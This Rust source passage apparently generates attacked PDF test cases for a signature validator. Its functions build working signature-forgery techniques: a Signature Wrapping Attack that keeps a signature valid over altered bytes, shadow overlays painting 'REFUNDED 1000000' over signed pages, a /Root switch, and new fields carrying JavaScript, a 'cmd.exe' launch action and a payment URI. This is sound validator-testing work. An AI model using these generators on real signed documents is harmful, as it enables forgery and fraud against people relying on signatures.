    trailer.push_str(&format!(" >>\nstartxref\n{table_at}\n%%EOF\n"));
    out.extend_from_slice(trailer.as_bytes());
    Some(out)
}

/// `isa_objstm_container_overwritten`: an appended revision that redefines an object as a new
/// object stream container (V10 (7): changing a container is `Other`). Raw, best-effort.
pub fn isa_objstm_container_overwritten(pdf: &[u8]) -> Option<Vec<u8>> {
    let prev = last_startxref(pdf)?;
    let body = format!(
        "4 0 obj\n<< /Type /ObjStm /N 0 /First 0 /Length 0 >>\nstream\n\nendstream\nendobj\n\
         xref\n0 1\n0000000000 65535 f \ntrailer\n<< /Size 9 /Root 1 0 R /Prev {prev} >>\n\
         startxref\n{prev}\n%%EOF\n"
    );
    Some(append(pdf, body.as_bytes()))
}

// =================================================================================================
// SWA: the /ByteRange gap no longer matches the real /Contents.
// =================================================================================================

/// `swa_gap_points_at_other_contents`: rewrites the `/ByteRange` so its gap `[o1+l1, o2)` no
/// longer coincides with the real `/Contents` token (V4 `GapNotContents`). Same length.
pub fn swa_gap_points_at_other_contents(pdf: &[u8]) -> Option<Vec<u8>> {
    replace_byte_range(pdf, b"[0 10 20 30]")
}

/// `swa_part2_shifted`: inserts a comment inside the signed part-2 region (right after the
/// `/Contents` token) without changing `/ByteRange`: the naive wrapping attempt. The digested
/// bytes move (not intact), the gap no longer ends at the `/Contents` token (V4
/// `GapNotContents`), and every later offset is off by six bytes (a repaired structure).
pub fn swa_part2_shifted(pdf: &[u8]) -> Option<Vec<u8>> {
    let span = contents_value_span(pdf)?;
    let mut out = pdf.to_vec();
    // A whitespace comment just after `/Contents <...>`, inside part 2 of the old ByteRange.
    out.splice(span.end..span.end, b" % swa".iter().copied());
    Some(out)
}

/// The width the new `/ByteRange` array of [`swa_part2_moved`] is padded to.
const SWA_BYTE_RANGE_WIDTH: usize = 48;

/// `swa_part2_moved`: the Signature Wrapping Attack of Mladenov et al. (CCS 2019, §5.3) on a
/// signature whose `/ByteRange` follows its `/Contents` (pyHanko's layout, so the `/ByteRange`
/// lies in signed part 2). The signed part 2 is moved, unchanged, to the end of the file; in the
/// space it leaves after `/Contents`, the attacker writes the rest of the signature dictionary
/// with a **new** `/ByteRange [0 a b' c]` whose part 2 is the moved copy, followed by a new
/// cross-reference section at the offset the moved part's (still signed) `startxref` names.
///
/// The ranges still digest to the signed value (intact, and the signature verifies), the file
/// is well formed, but the gap `[a, b')` is no longer the dictionary's `/Contents` token: it also
/// holds the unsigned dictionary tail and the attacker's cross-reference section (V4
/// `GapNotContents`, coverage `Unclear`). A verifier that does not compare the gap with the
/// `/Contents` token reports a valid signature over content the signer never saw.
///
/// `None` unless the file's last signature has the pyHanko layout, a classic cross-reference
/// table after its dictionary in part 2, part 2 ending at the end of the file, and room for the
/// new dictionary tail before that table's offset.
pub fn swa_part2_moved(pdf: &[u8]) -> Option<Vec<u8>> {
    // The last signature's /ByteRange [0 a b c], in part 2 (after its /Contents).
    let br_key = rfind(pdf, b"/ByteRange")?;
    let br_start = skip_ws(pdf, br_key.checked_add(b"/ByteRange".len())?)?;
    let br_span = array_span(pdf, br_start)?;
    let values = parse_ints(pdf.get(br_span.clone())?)?;
    let [0, a, b, c] = values.as_slice() else {
        return None;
    };
    let (a, b, c) = (
        usize::try_from(*a).ok()?,
        usize::try_from(*b).ok()?,
        usize::try_from(*c).ok()?,
    );
    if br_key < b || b.checked_add(c)? != pdf.len() || a >= b {
        return None;
    }
    // The dictionary tail: from the end of the gap to after its `endobj` and end of line.
    let endobj = br_span
        .end
        .checked_add(find(pdf.get(br_span.end..)?, b"endobj")?)?;
    let mut tail_end = endobj.checked_add(b"endobj".len())?;
    while pdf
        .get(tail_end)
        .is_some_and(|&ch| ch == b'\r' || ch == b'\n')
    {
        tail_end = tail_end.checked_add(1)?;
    }
    // The newest cross-reference section: a classic table after the dictionary, in part 2.
    let xref_at = usize::try_from(last_startxref(pdf)?).ok()?;
    if xref_at < tail_end || pdf.get(xref_at..xref_at.checked_add(4)?)? != b"xref" {
        return None;
    }
    let startxref_kw = rfind(pdf, b"startxref")?;
    let section = pdf.get(xref_at..startxref_kw)?;

    // X, inserted at b: [new tail | filler to xref_at | moved-offsets section]. Its length does
    // not depend on b' (fixed-width /ByteRange, ten-digit offsets).
    let tail_head = pdf.get(b..br_span.start)?;
    let tail_rest = pdf.get(br_span.end..tail_end)?;
    let tail_len = tail_head
        .len()
        .checked_add(SWA_BYTE_RANGE_WIDTH)?
        .checked_add(tail_rest.len())?;
    let filler = xref_at.checked_sub(b)?.checked_sub(tail_len)?;
    let x_len = tail_len.checked_add(filler)?.checked_add(section.len())?;
    let shift = x_len;
    let new_b = b.checked_add(shift)?;
    let mut new_range = format!("[0 {a} {new_b} {c}]").into_bytes();
    if new_range.len() > SWA_BYTE_RANGE_WIDTH {
        return None;
    }
    new_range.resize(SWA_BYTE_RANGE_WIDTH, b' ');
    let new_section = shift_xref_offsets(section, b, shift)?;

    let mut x = Vec::with_capacity(x_len);
    x.extend_from_slice(tail_head);
    x.extend_from_slice(&new_range);
    x.extend_from_slice(tail_rest);
    x.resize(x.len().checked_add(filler)?, b' ');
    if let Some(last) = x.last_mut() {
        *last = b'\n';
    }
    x.extend_from_slice(&new_section);
    if x.len() != x_len {
        return None;
    }
    let mut out = Vec::with_capacity(pdf.len().checked_add(x_len)?);
    out.extend_from_slice(pdf.get(..b)?);
    out.extend_from_slice(&x);
    out.extend_from_slice(pdf.get(b..)?);
    Some(out)
}

/// The integers of a `[...]` array token (`None` for anything else in it).
fn parse_ints(array: &[u8]) -> Option<Vec<i64>> {
    let inner = array.strip_prefix(b"[")?.strip_suffix(b"]")?;
    std::str::from_utf8(inner)
        .ok()?
        .split_ascii_whitespace()
        .map(|word| word.parse::<i64>().ok())
        .collect()
}

/// A classic cross-reference section (`xref`, subsections, `trailer` dictionary) with every
/// in-use entry at or after `from` moved by `shift` bytes (the ten-digit offsets keep their
/// width, §7.5.4). `None` for a malformed table or an offset that no longer fits.
fn shift_xref_offsets(section: &[u8], from: usize, shift: usize) -> Option<Vec<u8>> {
    let trailer = find(section, b"trailer")?;
    let (table, rest) = section.split_at(trailer);
    let mut out = Vec::with_capacity(section.len());
    for line in table.split_inclusive(|&ch| ch == b'\n') {
        let entry = line.len() >= 18
            && line.get(10) == Some(&b' ')
            && line.get(16) == Some(&b' ')
            && line.get(17) == Some(&b'n');
        if !entry {
            out.extend_from_slice(line);
            continue;
        }
        let offset: usize = std::str::from_utf8(line.get(..10)?).ok()?.parse().ok()?;
        let moved = if offset >= from {
            offset.checked_add(shift)?
        } else {
            offset
        };
        let digits = format!("{moved:010}");
        if digits.len() != 10 {
            return None;
        }
        out.extend_from_slice(digits.as_bytes());
        out.extend_from_slice(line.get(10..)?);
    }
    out.extend_from_slice(rest);
    Some(out)
}

/// `swa_two_dicts_same_byterange`: a well-formed appended revision that adds a second signature
/// dictionary carrying the same `/ByteRange` as the first (V4/V5: two dictionaries over one
/// range). `None` if the store refuses an incremental update.
pub fn swa_two_dicts_same_byterange(pdf: &[u8]) -> Option<Vec<u8>> {
    let range = pdf
        .get(byte_range_value_span(pdf)?)
        .map(<[u8]>::to_vec)
        .unwrap_or_else(|| b"[0 0 0 0]".to_vec());
    with_incremental(pdf, move |store| {
        let next = store.next_object_number();
        let mut d = Dict::new();
        d.insert("Type", Object::name("Sig"));
        d.insert("Filter", Object::name("Adobe.PPKLite"));
        d.insert("SubFilter", Object::name("ETSI.CAdES.detached"));
        // Reuse the exact /ByteRange token by parsing it back.
        let (array, _) =
            folioxide_syntax::parse_object(&range, 0, &folioxide_syntax::ParseCtx::default())
                .ok()?;
        d.insert("ByteRange", array);
        d.insert("Contents", Object::hex_string(vec![0u8; 16]));
        store.add(Object::Dict(d)).ok()?;
        // A distinct object so the update is non-empty even if `add` were a no-op.
        store
            .set_trailer_entry(keys::INFO, Object::Ref(ObjectId::new(next, 0)))
            .ok()
    })
}

/// `swa_sig_dict_redefined_in_update`: a well-formed appended revision that redefines the
/// signature dictionary object with a new value (V5 `SigDictRedefinedLater`). `None` if the
/// signature object cannot be identified.
pub fn swa_sig_dict_redefined_in_update(pdf: &[u8]) -> Option<Vec<u8>> {
    with_incremental(pdf, |store| {
        let sig = first_sig_dict(store)?;
        let mut d = store.resolve(sig).ok()?.as_dict()?.clone();
        d.insert("Reason", Object::literal_string("redefined"));
        store.set(sig, Object::Dict(d)).ok()
    })
}

// =================================================================================================
// Shadow: hide / replace / hide-and-replace in an appended revision.
// =================================================================================================

/// `shadow_hide_overlay_removed`: a well-formed revision that drops the last entry of the first
/// page's `/Annots` (V10 (5): removing an annotation reference is `Other`). `None` if the page
/// has no `/Annots` array with entries.
pub fn shadow_hide_overlay_removed(pdf: &[u8]) -> Option<Vec<u8>> {
    with_incremental(pdf, |store| {
        let page = first_page(store)?;
        let mut d = store.resolve(page).ok()?.as_dict()?.clone();
        let mut annots = d.get_array(b"Annots")?.to_vec();
        annots.pop()?;
        d.insert("Annots", Object::Array(annots));
        store.set(page, Object::Dict(d)).ok()
    })
}

/// `shadow_hide_repoint_to_signed_bytes`: an appended revision that redefines the first page's
/// content stream object as a reference to a *different* object, re-pointing it (V10: the
/// location changed, `Other`). `None` if there is no page content stream.
pub fn shadow_hide_repoint_to_signed_bytes(pdf: &[u8]) -> Option<Vec<u8>> {
    with_incremental(pdf, |store| {
        let content = first_page_contents(store)?;
        // A fresh stream the page content is re-pointed at (its `/Contents` would be changed to
        // this in a full attack; here the redefinition alone is the structural signal).
        set_stream(store, content, b"BT (shadow) Tj ET")
    })
}

/// `shadow_replace_font`: a well-formed revision that replaces the first font object with a
/// different one (V10 (8): `Other`). `None` if no font object is found.
pub fn shadow_replace_font(pdf: &[u8]) -> Option<Vec<u8>> {
    with_incremental(pdf, |store| {
        let font = first_object_of_type(store, b"Font")?;
        let mut d = store.resolve(font).ok()?.as_dict()?.clone();
        d.insert("BaseFont", Object::name("Courier"));
        store.set(font, Object::Dict(d)).ok()
    })
}

/// `shadow_replace_field_value`: a well-formed revision that changes a form field's value (V10
/// (4): a generic field-value change is `Other` in M3, `FORM_FILLING` in pyHanko). `None` if no
/// widget/field is found.
pub fn shadow_replace_field_value(pdf: &[u8]) -> Option<Vec<u8>> {
    with_incremental(pdf, |store| {
        let widget = first_object_of_subtype(store, b"Widget")?;
        let mut d = store.resolve(widget).ok()?.as_dict()?.clone();
        d.insert("V", Object::literal_string("tampered"));
        store.set(widget, Object::Dict(d)).ok()
    })
}

/// `shadow_root_switch`: a well-formed revision that adds a shadow catalog and switches the
/// trailer `/Root` to it (V10 trailer rule: a `/Root` switch is `Other`). The original catalog
/// stays in the file, unreferenced (Hide-and-Replace).
pub fn shadow_root_switch(pdf: &[u8]) -> Option<Vec<u8>> {
    with_incremental(pdf, |store| {
        let root = store.root_id()?;
        let mut shadow = store.resolve(root).ok()?.as_dict()?.clone();
        shadow.insert("Shadow", Object::Bool(true));
        let new_root = store.add(Object::Dict(shadow)).ok()?;
        store
            .set_trailer_entry(keys::ROOT, Object::Ref(new_root))
            .ok()
    })
}

/// `shadow_short_length_in_update`: an appended object whose declared `/Length` is shorter than
/// its stream data, hiding the tail behind the short length (V10 repair rule; M1 trap #14). Raw,
/// best-effort.
pub fn shadow_short_length_in_update(pdf: &[u8]) -> Option<Vec<u8>> {
    let prev = last_startxref(pdf)?;
    let body = format!(
        "4 0 obj\n<< /Length 2 >>\nstream\nHIDDEN CONTENT PAST THE LENGTH\nendstream\nendobj\n\
         xref\n0 1\n0000000000 65535 f \ntrailer\n<< /Size 9 /Root 1 0 R /Prev {prev} >>\n\
         startxref\n{prev}\n%%EOF\n"
    );
    Some(append(pdf, body.as_bytes()))
}

// =================================================================================================
// Shadow: overlays and new signature fields in an appended revision (QA findings 3, 9, 11).
// =================================================================================================

/// The text an overlay paints over the signed page.
const OVERLAY_TEXT: &[u8] = b"1 1 1 rg 0 0 612 792 re f 0 g BT /F1 24 Tf 72 720 Td \
    (REFUNDED 1000000) Tj ET";

/// A new full-page form XObject that paints white over the page and writes [`OVERLAY_TEXT`],
/// with the first page's `/F1` font when there is one.
fn add_overlay_appearance(store: &mut Store, page: ObjectId) -> Option<ObjectId> {
    let mut dict = Dict::new();
    dict.insert("Type", Object::name("XObject"));
    dict.insert("Subtype", Object::name("Form"));
    dict.insert(
        "BBox",
        Object::Array(vec![
            Object::Int(0),
            Object::Int(0),
            Object::Int(612),
            Object::Int(792),
        ]),
    );
    let resources = store
        .resolve(page)
        .ok()?
        .as_dict()?
        .get(b"Resources")
        .cloned();
    if let Some(resources) = resources {
        dict.insert("Resources", resources);
    }
    let stream = folioxide_syntax::Stream::new(dict, StreamData::Decoded(OVERLAY_TEXT.to_vec()));
    store.add(Object::Stream(Box::new(stream))).ok()
}

/// `[x1 y1 x2 y2]`.
fn rect(values: [i64; 4]) -> Object {
    Object::Array(values.into_iter().map(Object::Int).collect())
}

/// A well-formed revision that adds the annotation `build` makes (from the first page and a new
/// overlay appearance stream) to the first page's `/Annots`, and, when `register`, to the root
/// of the AcroForm's `/Fields`. `None` without a page or (when registering) an AcroForm.
fn with_new_annotation(
    pdf: &[u8],
    register: bool,
    build: impl FnOnce(&mut Store, ObjectId, ObjectId) -> Option<Dict>,
) -> Option<Vec<u8>> {
    with_incremental(pdf, |store| {
        let page = first_page(store)?;
        let appearance = add_overlay_appearance(store, page)?;
        let annotation = build(store, page, appearance)?;
        let id = store.add(Object::Dict(annotation)).ok()?;
        append_to_array_entry(store, page, b"Annots", id)?;
        if register {
            let root = store.root_id()?;
            let catalog = store.resolve(root).ok()?.as_dict()?.clone();
            match catalog.get(b"AcroForm")? {
                Object::Ref(acroform) => append_to_array_entry(store, *acroform, b"Fields", id)?,
                _ => return None,
            }
        }
        Some(())
    })
}

/// Appends a reference to `item` to the array `key` of the dictionary `holder` (direct, created
/// when absent, or the indirect array object).
fn append_to_array_entry(
    store: &mut Store,
    holder: ObjectId,
    key: &[u8],
    item: ObjectId,
) -> Option<()> {
    let mut dict = store.resolve(holder).ok()?.as_dict()?.clone();
    match dict.get(key).cloned() {
        Some(Object::Ref(array)) => {
            let mut items = store.resolve(array).ok()?.as_array()?.to_vec();
            items.push(Object::Ref(item));
            store.set(array, Object::Array(items)).ok()
        }
        Some(Object::Array(mut items)) => {
            items.push(Object::Ref(item));
            dict.insert(key.to_vec(), Object::Array(items));
            store.set(holder, Object::Dict(dict)).ok()
        }
        None => {
            dict.insert(key.to_vec(), Object::Array(vec![Object::Ref(item)]));
            store.set(holder, Object::Dict(dict)).ok()
        }
        Some(_) => None,
    }
}

/// A signature widget dictionary `/Type /Annot /Subtype /Widget /FT /Sig /T (Overlay) /F 4 /P
/// page`, plus `extra`.
fn overlay_widget(page: ObjectId, extra: Vec<(&'static str, Object)>) -> Dict {
    let mut dict = Dict::new();
    dict.insert("Type", Object::name("Annot"));
    dict.insert("Subtype", Object::name("Widget"));
    dict.insert("FT", Object::name("Sig"));
    dict.insert("T", Object::literal_string("Overlay"));
    dict.insert("F", Object::Int(4));
    dict.insert("P", Object::Ref(page));
    for (key, value) in extra {
        dict.insert(key, value);
    }
    dict
}

/// `/AP << /N appearance >>`.
fn normal_appearance(appearance: ObjectId) -> Object {
    let mut ap = Dict::new();
    ap.insert("N", Object::Ref(appearance));
    Object::Dict(ap)
}

/// `shadow_overlay_sig_widget_registered`: a new **visible** signature widget, registered at the
/// root of `/Fields` and on the page, whose appearance paints over the whole page (the control
/// case: a visible new signature field is `FormFilling` for Folioxide and pyHanko).
pub fn shadow_overlay_sig_widget_registered(pdf: &[u8]) -> Option<Vec<u8>> {
    with_new_annotation(pdf, true, |_, page, ap| {
        Some(overlay_widget(
            page,
            vec![
                ("Rect", rect([0, 0, 612, 792])),
                ("AP", normal_appearance(ap)),
            ],
        ))
    })
}

/// `shadow_overlay_sig_widget_rect_indirect`: as
/// [`shadow_overlay_sig_widget_registered`], with the `/Rect` an indirect array (QA T1, expert
/// atk_rect): visible, and the new `/Rect` object is explained by no rule (pyHanko and Folioxide:
/// `OTHER`).
pub fn shadow_overlay_sig_widget_rect_indirect(pdf: &[u8]) -> Option<Vec<u8>> {
    with_new_annotation(pdf, true, |store, page, ap| {
        let rect = store.add(rect([0, 0, 612, 792])).ok()?;
        Some(overlay_widget(
            page,
            vec![("Rect", Object::Ref(rect)), ("AP", normal_appearance(ap))],
        ))
    })
}

/// `shadow_overlay_widget_page_only`: a visible signature widget added to the page's `/Annots`
/// only, not to `/Fields` (QA A3b): not a signature field the form knows (`OTHER`).
pub fn shadow_overlay_widget_page_only(pdf: &[u8]) -> Option<Vec<u8>> {
    with_new_annotation(pdf, false, |_, page, ap| {
        Some(overlay_widget(
            page,
            vec![
                ("Rect", rect([0, 0, 612, 792])),
                ("AP", normal_appearance(ap)),
            ],
        ))
    })
}

/// `shadow_overlay_stamp_ft_sig`: a `/Subtype /Stamp` annotation carrying `/FT /Sig`, on the page
/// only (QA T2): a stamp, not a signature widget (`OTHER`).
pub fn shadow_overlay_stamp_ft_sig(pdf: &[u8]) -> Option<Vec<u8>> {
    with_new_annotation(pdf, false, |_, page, ap| {
        let mut dict = Dict::new();
        dict.insert("Type", Object::name("Annot"));
        dict.insert("Subtype", Object::name("Stamp"));
        dict.insert("FT", Object::name("Sig"));
        dict.insert("F", Object::Int(4));
        dict.insert("Rect", rect([0, 0, 612, 792]));
        dict.insert("P", Object::Ref(page));
        dict.insert("AP", normal_appearance(ap));
        Some(dict)
    })
}

/// `shadow_overlay_sig_widget_no_rect`: a registered signature widget with an appearance but no
/// `/Rect` (QA T3): invisible, but its new appearance stream is form filling (`FORM_FILLING`).
pub fn shadow_overlay_sig_widget_no_rect(pdf: &[u8]) -> Option<Vec<u8>> {
    with_new_annotation(pdf, true, |_, page, ap| {
        Some(overlay_widget(page, vec![("AP", normal_appearance(ap))]))
    })
}

/// `shadow_overlay_sig_widget_zero_width`: a registered signature widget with an appearance and
/// a zero-width `/Rect` (QA T5): invisible, its new appearance stream is form filling
/// (`FORM_FILLING`).
pub fn shadow_overlay_sig_widget_zero_width(pdf: &[u8]) -> Option<Vec<u8>> {
    with_new_annotation(pdf, true, |_, page, ap| {
        Some(overlay_widget(
            page,
            vec![
                ("Rect", rect([0, 0, 0, 792])),
                ("AP", normal_appearance(ap)),
            ],
        ))
    })
}

/// An invisible signature field (`/Rect [0 0 0 0]`, `/F 132`) named `Signature2`, plus `extra`.
fn invisible_sig_field(page: ObjectId, extra: Vec<(&'static str, Object)>) -> Dict {
    let mut dict = overlay_widget(page, extra);
    dict.insert("T", Object::literal_string("Signature2"));
    dict.insert("F", Object::Int(132));
    dict.insert("Rect", rect([0, 0, 0, 0]));
    dict
}

/// A JavaScript action (§12.6.4.17).
fn javascript_action() -> Dict {
    let mut action = Dict::new();
    action.insert("S", Object::name("JavaScript"));
    action.insert("JS", Object::literal_string("app.alert(1)"));
    action
}

/// `shadow_new_sig_field_aa_indirect`: a new invisible signature field whose `/AA` is a new
/// indirect dictionary holding a new JavaScript action (expert atk_aa): pyHanko clears only the
/// field and its `/AP /Lock /SV`, so the action objects are unexplained (`OTHER`).
pub fn shadow_new_sig_field_aa_indirect(pdf: &[u8]) -> Option<Vec<u8>> {
    with_new_annotation(pdf, true, |store, page, _| {
        let action = store.add(Object::Dict(javascript_action())).ok()?;
        let mut aa = Dict::new();
        aa.insert("PO", Object::Ref(action));
        let aa = store.add(Object::Dict(aa)).ok()?;
        Some(invisible_sig_field(page, vec![("AA", Object::Ref(aa))]))
    })
}

/// `shadow_new_sig_field_aa_direct`: the same with a direct `/AA` (expert atk_aa_direct, QA
/// role_inv_AA_js): Folioxide `OTHER` (no signer gives its field additional actions); pyHanko
/// `LTA_UPDATES` (only the field is new; the unused overlay appearance stream is an orphan).
pub fn shadow_new_sig_field_aa_direct(pdf: &[u8]) -> Option<Vec<u8>> {
    with_new_annotation(pdf, true, |_, page, _| {
        let mut aa = Dict::new();
        aa.insert("PO", Object::Dict(javascript_action()));
        Some(invisible_sig_field(page, vec![("AA", Object::Dict(aa))]))
    })
}

/// `shadow_new_sig_field_ap`: a new invisible signature field with a new `/AP` stream (expert
/// atk_ap): the appearance is form filling (`FORM_FILLING`).
pub fn shadow_new_sig_field_ap(pdf: &[u8]) -> Option<Vec<u8>> {
    with_new_annotation(pdf, true, |_, page, ap| {
        Some(invisible_sig_field(
            page,
            vec![("AP", normal_appearance(ap))],
        ))
    })
}

/// A new invisible signature field whose `/A` is the direct action `action` (§12.6.4).
fn new_sig_field_with_action(pdf: &[u8], action: Dict) -> Option<Vec<u8>> {
    with_new_annotation(pdf, true, |_, page, _| {
        Some(invisible_sig_field(page, vec![("A", Object::Dict(action))]))
    })
}

/// `shadow_new_sig_field_a_javascript`: a new invisible signature field whose `/A` is a
/// JavaScript action (QA role_inv_A_js). Folioxide: `OTHER` (no signer gives its field an
/// action); pyHanko: `LTA_UPDATES`.
pub fn shadow_new_sig_field_a_javascript(pdf: &[u8]) -> Option<Vec<u8>> {
    new_sig_field_with_action(pdf, javascript_action())
}

/// `shadow_new_sig_field_a_launch`: the same with a launch action (§12.6.4.6, QA
/// role_inv_A_launch). Folioxide: `OTHER`; pyHanko: `LTA_UPDATES`.
pub fn shadow_new_sig_field_a_launch(pdf: &[u8]) -> Option<Vec<u8>> {
    let mut action = Dict::new();
    action.insert("S", Object::name("Launch"));
    action.insert("F", Object::literal_string("cmd.exe"));
    new_sig_field_with_action(pdf, action)
}

/// `shadow_new_sig_field_a_uri`: the same with a URI action (§12.6.4.8, QA role_inv_A_uri).
/// Folioxide: `OTHER`; pyHanko: `LTA_UPDATES`.
pub fn shadow_new_sig_field_a_uri(pdf: &[u8]) -> Option<Vec<u8>> {
    let mut action = Dict::new();
    action.insert("S", Object::name("URI"));
    action.insert("URI", Object::literal_string("https://example.invalid/pay"));
    new_sig_field_with_action(pdf, action)
}

/// `shadow_new_sig_field_oc`: a new invisible signature field with optional content `/OC`
/// (§8.11.2.2, a direct membership dictionary; QA role_inv_with_OC). Folioxide: `OTHER`;
/// pyHanko: `LTA_UPDATES`.
pub fn shadow_new_sig_field_oc(pdf: &[u8]) -> Option<Vec<u8>> {
    with_new_annotation(pdf, true, |_, page, _| {
        let mut membership = Dict::new();
        membership.insert("Type", Object::name("OCMD"));
        membership.insert("OCGs", Object::Array(Vec::new()));
        membership.insert("P", Object::name("AllOn"));
        Some(invisible_sig_field(
            page,
            vec![("OC", Object::Dict(membership))],
        ))
    })
}

/// `shadow_new_sig_field_parent`: a new invisible signature field registered at the root of
/// `/Fields` whose `/Parent` is the document's signed signature field (§12.7.4.1: a field
/// inherits `/FT` and `/V` from its parent, so a viewer may show the new widget as signed by the
/// earlier signature, and its fully qualified name changes). No signer writes `/Parent` on a new
/// root field. Folioxide: `OTHER`; pyHanko: `LTA_UPDATES`.
pub fn shadow_new_sig_field_parent(pdf: &[u8]) -> Option<Vec<u8>> {
    with_new_annotation(pdf, true, |store, page, _| {
        let signed = first_signed_sig_field(store)?;
        Some(invisible_sig_field(
            page,
            vec![("Parent", Object::Ref(signed))],
        ))
    })
}

/// The first signature field with a `/V`: `/FT /Sig` and a `/V` entry.
fn first_signed_sig_field(store: &Store) -> Option<ObjectId> {
    store.object_ids().into_iter().find(|&id| {
        store.resolve(id).ok().is_some_and(|obj| {
            obj.as_dict().is_some_and(|d| {
                d.get_name(b"FT").is_some_and(|ft| ft == b"Sig") && d.contains_key(b"V")
            })
        })
    })
}

/// `new_sig_field_mk`: the control case, a new invisible signature field with appearance
/// characteristics `/MK` (§12.5.6.19, which Acrobat writes): `LTA_UPDATES` in both.
pub fn new_sig_field_mk(pdf: &[u8]) -> Option<Vec<u8>> {
    with_new_annotation(pdf, true, |_, page, _| {
        let mut characteristics = Dict::new();
        characteristics.insert(
            "BC",
            Object::Array(vec![Object::Int(0), Object::Int(0), Object::Int(0)]),
        );
        Some(invisible_sig_field(
            page,
            vec![("MK", Object::Dict(characteristics))],
        ))
    })
}

// =================================================================================================
// Shadow: documents prepared before signing so that one object has two roles (expert finding 10).
// =================================================================================================

/// An unsigned document for [`shadow_info_alias_content`]: `minimal`-like `pdf` with a revision
/// that makes the trailer's `/Info` the first page's content stream. `None` without one.
pub fn info_alias_content_input(pdf: &[u8]) -> Option<Vec<u8>> {
    with_incremental(pdf, |store| {
        let content = first_page_contents(store)?;
        store
            .set_trailer_entry(keys::INFO, Object::Ref(content))
            .ok()
    })
}

/// `shadow_info_alias_content`: on a document signed with its `/Info` aliased to the page
/// content ([`info_alias_content_input`]), a revision that replaces that stream (expert
/// atk_info): the "document information" is the page content, so the change is `OTHER` (pyHanko:
/// an `/Info` stream is never whitelisted).
pub fn shadow_info_alias_content(pdf: &[u8]) -> Option<Vec<u8>> {
    isa_classic_content_replaced(pdf)
}

/// An unsigned document for [`shadow_markinfo_alias_font`]: `pdf` with a revision that makes the
/// catalog's `/MarkInfo` the first font dictionary. `None` without a font.
pub fn markinfo_alias_font_input(pdf: &[u8]) -> Option<Vec<u8>> {
    with_incremental(pdf, |store| {
        let font = first_object_of_type(store, b"Font")?;
        let root = store.root_id()?;
        let mut catalog = store.resolve(root).ok()?.as_dict()?.clone();
        catalog.insert("MarkInfo", Object::Ref(font));
        store.set(root, Object::Dict(catalog)).ok()
    })
}

/// `shadow_markinfo_alias_font`: on a document signed with its `/MarkInfo` aliased to the page
/// font ([`markinfo_alias_font_input`]), a revision that changes the font's `/BaseFont` (expert
/// atk_markinfo): the font is also used by the page, so the change is `OTHER`.
pub fn shadow_markinfo_alias_font(pdf: &[u8]) -> Option<Vec<u8>> {
    shadow_replace_font(pdf)
}

/// An unsigned document for [`shadow_info_alias_annotation`]: `pdf` with a revision that adds a
/// visible square annotation to the first page and makes the trailer's `/Info` that annotation.
pub fn info_alias_annotation_input(pdf: &[u8]) -> Option<Vec<u8>> {
    with_incremental(pdf, |store| {
        let page = first_page(store)?;
        let mut square = Dict::new();
        square.insert("Type", Object::name("Annot"));
        square.insert("Subtype", Object::name("Square"));
        square.insert("F", Object::Int(4));
        square.insert("Rect", rect([60, 660, 520, 760]));
        square.insert(
            "C",
            Object::Array(vec![Object::Int(1), Object::Int(0), Object::Int(0)]),
        );
        square.insert("Title", Object::literal_string("Do not pay before 2027"));
        let id = store.add(Object::Dict(square)).ok()?;
        append_to_array_entry(store, page, b"Annots", id)?;
        store.set_trailer_entry(keys::INFO, Object::Ref(id)).ok()
    })
}

/// `shadow_info_alias_annotation`: on a document signed with its `/Info` aliased to a page
/// annotation ([`info_alias_annotation_input`]), a revision that hides the annotation (`/F 2`,
/// Hidden) while it looks like a document-information update: `OTHER` (the annotation is also
/// used on the page).
pub fn shadow_info_alias_annotation(pdf: &[u8]) -> Option<Vec<u8>> {
    with_incremental(pdf, |store| {
        let annotation = first_object_of_subtype(store, b"Square")?;
        let mut dict = store.resolve(annotation).ok()?.as_dict()?.clone();
        dict.insert("F", Object::Int(2));
        store.set(annotation, Object::Dict(dict)).ok()
    })
}

/// Where [`page_parent_alias_input`] registers the dictionary that becomes the page's `/Parent`.
#[derive(Clone, Copy)]
enum AliasRole {
    /// The trailer's `/Info`.
    Info,
    /// The catalog's `/MarkInfo`.
    MarkInfo,
}

/// An unsigned document for the page-`/Parent` alias cases: `pdf` (`minimal`-like) with a
/// revision that
/// - moves the first page's `/Resources` to its `/Kids`-tree parent (the `/Pages` node) and to a
///   new page-tree node `X = << /Type /Pages /Kids [page] /Count 1 /Resources … >>` outside the
///   `/Kids` tree, makes `X` the page's `/Parent` (readers that inherit through `/Parent`,
///   §7.7.3.4, read the page's resources from `X`), and registers `X` as `role`;
/// - adds an unused Courier font, planted for the attack to point the page's `/F1` at.
fn page_parent_alias_input(pdf: &[u8], role: AliasRole) -> Option<Vec<u8>> {
    with_incremental(pdf, |store| {
        let page = first_page(store)?;
        let mut page_dict = store.resolve(page).ok()?.as_dict()?.clone();
        let resources = page_dict.remove(b"Resources".as_slice())?;
        let pages = page_dict.get_ref(b"Parent")?;
        let mut pages_dict = store.resolve(pages).ok()?.as_dict()?.clone();
        pages_dict.insert("Resources", resources.clone());
        store.set(pages, Object::Dict(pages_dict)).ok()?;

        let mut alias = Dict::new();
        alias.insert("Type", Object::name("Pages"));
        alias.insert("Kids", Object::Array(vec![Object::Ref(page)]));
        alias.insert("Count", Object::Int(1));
        alias.insert("Resources", resources);
        if matches!(role, AliasRole::MarkInfo) {
            alias.insert("Marked", Object::Bool(true));
        }
        let alias = store.add(Object::Dict(alias)).ok()?;
        page_dict.insert("Parent", Object::Ref(alias));
        store.set(page, Object::Dict(page_dict)).ok()?;

        let mut courier = Dict::new();
        courier.insert("Type", Object::name("Font"));
        courier.insert("Subtype", Object::name("Type1"));
        courier.insert("BaseFont", Object::name("Courier"));
        store.add(Object::Dict(courier)).ok()?;

        match role {
            AliasRole::Info => store.set_trailer_entry(keys::INFO, Object::Ref(alias)).ok(),
            AliasRole::MarkInfo => {
                let root = store.root_id()?;
                let mut catalog = store.resolve(root).ok()?.as_dict()?.clone();
                catalog.insert("MarkInfo", Object::Ref(alias));
                store.set(root, Object::Dict(catalog)).ok()
            }
        }
    })
}

/// An unsigned document for [`shadow_info_alias_page_parent`]: `pdf` (`minimal`-like) with a
/// revision that moves the first page's `/Resources` to its `/Pages` node and to a new page-tree
/// node `<< /Type /Pages /Kids [page] /Count 1 /Resources … >>` outside the `/Kids` tree, makes
/// that node the page's `/Parent` (readers that inherit through `/Parent`, §7.7.3.4, read the
/// page's resources from it) and the trailer's `/Info`, and plants an unused Courier font.
pub fn info_alias_page_parent_input(pdf: &[u8]) -> Option<Vec<u8>> {
    page_parent_alias_input(pdf, AliasRole::Info)
}

